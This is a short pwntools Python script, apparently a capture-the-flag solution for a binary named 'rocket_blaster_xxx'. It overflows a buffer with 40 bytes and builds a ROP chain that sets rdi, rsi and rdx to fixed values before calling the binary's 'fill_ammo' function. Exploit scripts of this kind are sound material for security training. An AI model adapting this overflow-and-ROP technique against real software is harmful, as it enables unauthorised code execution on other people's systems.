from pwn import *

exe = './rocket_blaster_xxx'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'
library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = process(exe)

rop = ROP(elf)
p = flat([
    cyclic(40),
    rop.find_gadget([
        'ret'
    ]).address,
    rop.find_gadget([
        'pop rdi',
        'ret'
    ]).address,
    0xdeadbeef,
    rop.find_gadget([
        'pop rsi',
        'ret'
    ]).address,
    0xdeadbabe,
    rop.find_gadget([
        'pop rdx',
        'ret'
    ]).address,
    0xdead1337,
    elf.sym['fill_ammo']
])

sh.sendline(p)
sh.interactive()
